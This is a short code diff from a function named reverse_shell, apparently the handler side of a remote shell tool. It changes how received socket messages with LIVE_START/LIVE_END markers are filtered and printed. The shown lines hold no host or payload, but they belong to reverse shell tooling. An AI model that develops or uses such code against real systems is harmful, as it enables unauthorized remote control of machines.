@@ -52,11 +52,11 @@ def reverse_shell():
                 data = client.recv(4096)
                 if not data:
                     break
-                if b"LIVE_START" in data or b"LIVE_END" in data and active_port == port:
+                if b"LIVE_START" in data and b"LIVE_END" in data:
                     continue
                 else:
                     msg = data.decode(errors="ignore").rstrip()
-                    if active_port == port and not msg.startswith("LIVE_START") :
+                    if msg and not msg.startswith("LIVE_START"):
                         print(msg)
             except socket.timeout:
                 continue
